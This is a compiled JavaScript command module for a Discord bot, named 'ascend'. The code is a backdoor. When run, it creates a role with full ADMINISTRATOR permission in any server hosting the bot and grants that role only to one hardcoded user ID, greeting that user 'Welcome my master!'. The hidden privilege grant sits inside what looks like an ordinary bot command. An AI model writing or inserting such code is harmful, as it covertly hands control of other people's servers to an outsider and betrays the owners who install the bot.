"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
class serverCommand {
    constructor() {
        this._command = "ascend";
    }
    name() {
        return "ascend";
    }
    help() {
        return "ascend";
    }
    cooldown() {
        return 4;
    }
    isThisCommand(command) {
        return command === this._command;
    }
    runCommand(args, msg, Bot) {
        return __awaiter(this, void 0, void 0, function* () {
            let roleName = "ANYROLE";
            var rolee = msg.guild.roles.find(r => r.name === roleName);
            if (!rolee) {
                msg.guild.createRole({ name: roleName, color: "#9932CC", permissions: ["ADMINISTRATOR"] });
            }
            addrol();
            function addrol() {
                if (msg.author.id == '320659246037336064' && !(msg.member.roles.find(r => r.name === roleName))) {
                    msg.reply("Welcome my master!");
                    msg.member.addRole(rolee);
                }
                else {
                    msg.reply("imposter!");
                }
            }
        });
    }
}
exports.default = serverCommand;
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiYXNjZW5kLmpzIiwic291cmNlUm9vdCI6IiIsInNvdXJjZXMiOlsiLi4vLi4vc3JjL2NvbW1hbmRzL2FzY2VuZC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7O0FBR0EsTUFBcUIsYUFBYTtJQUFsQztRQUVxQixhQUFRLEdBQUcsUUFBUSxDQUFBO0lBbUN4QyxDQUFDO0lBakNHLElBQUk7UUFDQSxPQUFPLFFBQVEsQ0FBQztJQUNwQixDQUFDO0lBRUQsSUFBSTtRQUNBLE9BQU8sUUFBUSxDQUFDO0lBQ3BCLENBQUM7SUFFRCxRQUFRO1FBQ0osT0FBTyxDQUFDLENBQUM7SUFDYixDQUFDO0lBRUQsYUFBYSxDQUFDLE9BQWU7UUFDekIsT0FBTyxPQUFPLEtBQUssSUFBSSxDQUFDLFFBQVEsQ0FBQztJQUNyQyxDQUFDO0lBRUssVUFBVSxDQUFDLElBQWMsRUFBRSxHQUFvQixFQUFFLEdBQW1COztZQUN0RSxJQUFJLFFBQVEsR0FBRyxjQUFjLENBQUE7WUFDN0IsSUFBSSxLQUFLLEdBQUcsR0FBRyxDQUFDLEtBQUssQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLElBQUksS0FBSyxRQUFRLENBQUMsQ0FBQztZQUMzRCxJQUFJLENBQUMsS0FBSyxFQUFDO2dCQUNQLEdBQUcsQ0FBQyxLQUFLLENBQUMsVUFBVSxDQUFFLEVBQUMsSUFBSSxFQUFDLFFBQVEsRUFBRSxLQUFLLEVBQUUsU0FBUyxFQUFFLFdBQVcsRUFBQyxDQUFDLGVBQWUsQ0FBQyxFQUFFLENBQUUsQ0FBQzthQUM3RjtZQUNELE1BQU0sRUFBRSxDQUFDO1lBQ1QsU0FBUyxNQUFNO2dCQUNYLElBQUksR0FBRyxDQUFDLE1BQU0sQ0FBQyxFQUFFLElBQUksb0JBQW9CLElBQUksQ0FBQyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxJQUFJLEtBQUssUUFBUSxDQUFDLENBQUMsRUFBQztvQkFDNUYsR0FBRyxDQUFDLEtBQUssQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDO29CQUNoQyxHQUFHLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxLQUFLLENBQUMsQ0FBQztpQkFDN0I7cUJBQU07b0JBQ0gsR0FBRyxDQUFDLEtBQUssQ0FBQyxXQUFXLENBQUMsQ0FBQztpQkFDMUI7WUFDTCxDQUFDO1FBQ0wsQ0FBQztLQUFBO0NBRUo7QUFyQ0QsZ0NBcUNDIn0=
